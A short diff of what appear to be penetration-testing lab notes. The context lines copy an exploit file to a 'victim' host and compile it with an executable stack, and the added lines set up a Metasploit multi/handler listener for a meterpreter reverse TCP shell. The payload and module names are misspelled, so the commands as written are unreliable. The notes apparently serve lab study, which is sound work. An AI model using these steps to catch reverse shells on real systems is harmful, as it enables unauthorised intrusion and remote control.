@@ -67,6 +67,12 @@ int main (int argc, char **argv)
 scp /tmp/hack.c offsec@192.168.201.45:/tmp/
 
 Kali -> use milti/handler
+LIstener:
+sudo msfconsole -q
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcps
+set lhost
+set lport
 
 # compile code on victim
 gcc -o hack.out hack.c -z execstack
